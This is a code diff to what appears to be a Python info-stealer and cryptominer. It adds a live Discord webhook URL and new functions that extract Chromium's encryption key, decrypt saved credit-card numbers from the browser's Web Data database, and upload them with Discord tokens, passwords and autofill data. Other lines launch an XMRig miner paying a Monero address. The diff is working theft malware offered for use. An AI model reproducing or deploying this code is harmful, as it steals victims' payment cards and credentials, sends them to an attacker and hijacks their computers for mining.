@@ -57,7 +57,7 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "https://discord.com/api/webhooks/1010398867805708299/DqXsghNJ2GAeEtrWidYkdI7_t2YyCbh4QNT9S2iBiaAT3_UZEZzCSAH-TCtvC-hhUCwp"
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -511,7 +511,90 @@ if yes == "yes":
 				return b"OS not supported."
 		except Exception as e:
 			return "Error : " + str(e)
+	def get_chrome_datetime(chromedate):
+		"""Return a `datetime.datetime` object from a chrome format datetime
+		Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+		return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
+	def get_encryption_key(path):
+
+		local_state_path = path
+		with open(local_state_path, "r", encoding="utf-8") as f:
+			local_state = f.read()
+			local_state = json.loads(local_state)
+
+		# decode the encryption key from Base64
+		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+		# remove DPAPI str
+		key = key[5:]
+		# return decrypted key that was originally encrypted
+		# using a session key derived from current user's logon credentials
+		# doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+	def decrypt_password(password, key):
+		try:
+			# get the initialization vector
+			iv = password[3:15]
+			password = password[15:]
+			# generate cipher
+			cipher = AES.new(key, AES.MODE_GCM, iv)
+			# decrypt password
+			return cipher.decrypt(password)[:-16].decode()
+		except:
+			try:
+				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+			except:
+				# not supported
+				return ""
+	def getccs():
+		try:
+			ccss = ""
+			for i in range(len(chromiumpaths)):
+				print(i)
+				local_state_path = chromiumpaths[i]  + "\\Local State"
+				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
+					if not os.path.isfile(chromiumpaths[i] + "\\User Data"+ "\\Local State"):
+						continue
+					else:
+						local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
+				# get the AES key
+				key = get_encryption_key(local_state_path)
+				# local sqlite Chrome database path
+				db_path = chromiumpaths[i] + "\\Web Data"
+				# copy the file to another location
+				# as the database will be locked if chrome is currently running
+				filename = "ChromeData.db"
+				shutil.copyfile(db_path, filename)
+				# connect to the database
+				db = sqlite3.connect(filename)
+				cursor = db.cursor()
+				# `logins` table has the data we need
+				cursor.execute("SELECT * FROM 'credit_cards'")
+				# iterate over all rows
+				for row in cursor.fetchall():
+					action_url = row[1]
+					username = row[2]
+					password = row[3]
+					date_created = decrypt_password(row[4], key)	
+					if username or password:
+						ccss =ccss + "\n======================================\nName on card : " + str(action_url)
+						ccss =ccss +"\nEXP_Month : "+ str(username)
+						ccss =ccss +"\nEXP_Year: " + str(password)
+						ccss =ccss +"\nCard Num: " + str(date_created)
+					else:
+						continue
+					print("="*50)
+			cursor.close()
+			db.close()
+			try:
+				# try to remove the copied db file
+				os.remove(filename)
+			except:
+				pass
+		except:
+			pass
+		return ccss
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
 		os.system(XMRIGPATH)
@@ -650,7 +733,11 @@ if yes == "yes":
 		webhook.add_embed(embed)
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
 		print("[.] Password : "+ main())
+		ccs = getccs()
+		print(ccs)
+		webhook.add_file(file=ccs, filename="Cr3d1t_C4rds.txt")
 		webhook.add_file(file=str(main()), filename="0xPasswords.txt")
+		
 		try:
 			autofill = stealChromeWin()
 			autfill = str(autofill).split(":::667")
@@ -658,6 +745,7 @@ if yes == "yes":
 		except:
 			autfill = ["dazdaz", "dazdza", "dazdhjnza"]
 		webhook.add_file(file=autfill[0], filename="Autofill.txt")
+
 		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
 
 		"""+autfill[1] + autfill[2], filename="finance_and_money.txt")
